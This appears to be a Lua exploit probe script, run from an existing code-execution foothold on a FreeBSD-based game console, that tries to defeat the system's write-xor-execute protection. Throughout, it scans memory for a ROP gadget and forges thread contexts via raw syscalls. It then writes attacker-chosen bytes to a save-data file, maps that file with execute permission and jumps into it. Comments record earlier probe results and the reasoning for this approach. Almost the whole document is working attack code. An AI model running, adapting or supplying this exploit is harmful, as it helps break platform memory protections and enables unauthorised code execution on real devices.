-- CRASH_CLASS: HIGH
-- PROBE 939a: file-backed executable mapping of attacker-written content
--
-- Context: the W^X wall was measured on anonymous, GPU and shm objects (928b,
-- 928c, 934a): PROT_EXEC is accepted by mmap and then dropped, and mprotect
-- always fails.  A static scan of the 13.60 text shows why mprotect cannot win:
-- every internal call to vm_map_protect (0xffffffff8ac8bdb0) passes prot 1 or 3,
-- and the single user path (sys 74) masks the request and then hits the entry's
-- max_prot, which never contains 0x4.
--
-- What was never tested is the *creation* side: a mapping whose backing object is
-- a file.  FreeBSD gives file-backed entries max_prot from the vnode, and the
-- loader can write to /savedata0 (it is where misc.lua lives), so a file we
-- author can be mapped and asked for X without going through mprotect at all.
--
-- Section A: control spawn at fn (proves the harness is alive this run)
-- Section B: open(/savedata0/xcode.bin, O_RDWR|O_CREAT) -> write 0xC3.. -> mmap(prot=5)
-- Section C: spawn at the file mapping
-- Section D: if B failed, the same sequence on a file we only read
--
-- A context dump instead of a clean return is the failure signature used in 928b;
-- the process dies with it, so the sections are ordered to finish the bookkeeping
-- first.

print("=== PROBE 939a: FILE-BACKED EXECUTABLE MAPPING ===")
print("")

local function to_num(v)
    if type(v) == "table" then
        if v.tonumber then local n = v:tonumber() if n then return n end end
        if v.h then return v.h * 4294967296 + v.l end
    end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function rd(a) local o, v = pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end return nil end
local function rq(a) local o, v = pcall(function() return memory.read_qword(a) end); if o then return v end return nil end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function zero(a, n) pcall(function() for i = 0, n - 4, 4 do memory.write_dword(a + i, 0) end end) end
local function call(f, ...)
    local ok, rv = pcall(f, ...)
    if not ok then return nil end
    return to_num(rv)
end

local fn = to_num(syscall.pipe.fn_addr)
print("[0] pid=" .. tostring(to_num(native.fcall_with_rax(syscall.pipe.fn_addr, 20))))

local info = memory.alloc(0x200); wd(info, 0x160)
pcall(function() mk(593)(uint64(0), uint64(info)) end)
local ebase = (rd(info + 0x10C) or 0) * 4294967296 + (rd(info + 0x108) or 0)
local function find_pat(base, limit, pat)
    local off = 0
    while off < limit do
        local want = limit - off
        if want > 0x1000 then want = 0x1000 end
        local ok, s = pcall(function() return memory.read_buffer(base + off, want) end)
        if not ok or type(s) ~= "string" then return nil end
        local i = string.find(s, pat, 1, true)
        if i then return base + off + i - 1 end
        off = off + want
    end
end
local pop_rax = find_pat(ebase, 0x494000, string.char(0x58, 0xC3))
print(string.format("[0] pop_rax=%s", tostring(pop_rax)))

local PAGE = 0x4000
local function mmap(px, prot, flags, fd)
    local ok, a = pcall(function() return mk(477)(uint64(0), uint64(px), uint64(prot), uint64(flags), uint64(fd), uint64(0)) end)
    if not ok then return nil end
    return to_num(a)
end

local block = mmap(PAGE * 4, 3, 0x1002, 0xFFFFFFFF)
local start = block + PAGE * 4 - 0x200
local ctx = memory.alloc(0x500)
local tb = memory.alloc(8)
local Ctx = { MAGIC = 0x108, TYPE = 0x110, CS = 0x0C0, RIP = 0x0E0, RSP = 0x0F8, SS = 0x100,
              RDI = 0x048, RSI = 0x050, RDX = 0x058, RCX = 0x060, R8 = 0x068, RAX = 0x078 }

local function spawn_at(entry, rdi, sysno)
    if pop_rax then
        wq(start, uint64(pop_rax)); wq(start + 8, uint64(431)); wq(start + 16, uint64(fn))
    end
    zero(ctx, 0x500)
    wq(ctx + Ctx.MAGIC, uint64(0x480)); wq(ctx + Ctx.TYPE, uint64(0x10000))
    wq(ctx + Ctx.CS, uint64(0x43)); wq(ctx + Ctx.SS, uint64(0x3B))
    wq(ctx + Ctx.RIP, uint64(entry)); wq(ctx + Ctx.RSP, uint64(start))
    wq(ctx + Ctx.RDI, uint64(rdi or 0)); wq(ctx + Ctx.RSI, uint64(0))
    wq(ctx + Ctx.RDX, uint64(0)); wq(ctx + Ctx.RCX, uint64(0))
    wq(ctx + Ctx.R8, uint64(0)); wq(ctx + Ctx.RAX, uint64(sysno or 20))
    wq(tb, uint64(0))
    local ok, rv = pcall(function() return mk(430)(uint64(ctx), uint64(tb), uint64(0)) end)
    return ok, rv
end

-- A: control
local out = mmap(PAGE, 3, 0x1002, 0xFFFFFFFF)
print("[A] control spawn at fn:")
local okA, rvA = spawn_at(fn, out)
print(string.format("   ok=%s rv=%s (no context dump = alive)", tostring(okA), tostring(rvA)))

-- B: file + mmap
local name = "/savedata0/xcode.bin"
local fd = call(function() return mk(5)(name, uint64(0x202), uint64(0x1FF)) end)
print(string.format("[B] open(%q, O_RDWR|O_CREAT) = %s", name, tostring(fd)))
local payload = mmap(PAGE, 3, 0x1002, 0xFFFFFFFF)
for i = 0, 0x3F do pcall(function() memory.write_byte(payload + i, 0xC3) end) end
local wrote = nil
if fd and fd >= 0 then
    wrote = call(function() return mk(4)(uint64(fd), uint64(payload), uint64(0x40)) end)
    print(string.format("[B] write(fd, buf, 0x40) = %s", tostring(wrote)))
end
local filemap = nil
if fd and fd >= 0 then
    filemap = mmap(PAGE, 5, 0x2, fd)          -- PROT_READ|PROT_EXEC, MAP_PRIVATE
    print(string.format("[B] mmap(prot=5, MAP_PRIVATE, fd) = %s", tostring(filemap)))
    if filemap and filemap ~= 0 then
        local b = nil
        local okb, vb = pcall(function() return memory.read_byte(filemap) end)
        if okb then b = to_num(vb) end
        print(string.format("[B] first byte in file mapping = %s (expect 195 = 0xC3)", tostring(b)))
        local p2 = mmap(PAGE, 7, 0x2, fd)
        print(string.format("[B] mmap(prot=7, MAP_PRIVATE, fd) = %s", tostring(p2)))
        filemap = filemap or p2
    end
end
if not filemap or filemap == 0 then
    -- fallback: a file that certainly exists
    local fd2 = call(function() return mk(5)("/savedata0/misc.lua", uint64(0), uint64(0)) end)
    print(string.format("[D] open(/savedata0/misc.lua, O_RDONLY) = %s", tostring(fd2)))
    if fd2 and fd2 >= 0 then
        filemap = mmap(PAGE, 5, 0x2, fd2)
        print(string.format("[D] mmap(prot=5, MAP_PRIVATE, fd2) = %s", tostring(filemap)))
    end
end

if filemap and filemap ~= 0 then
    print("[C] spawn at the file mapping:")
    local okC, rvC = spawn_at(filemap, 0)
    print(string.format("   ok=%s rv=%s", tostring(okC), tostring(rvC)))
else
    print("[C] no file mapping to execute")
end

print("")
print("=== PROBE 939a COMPLETE ===")
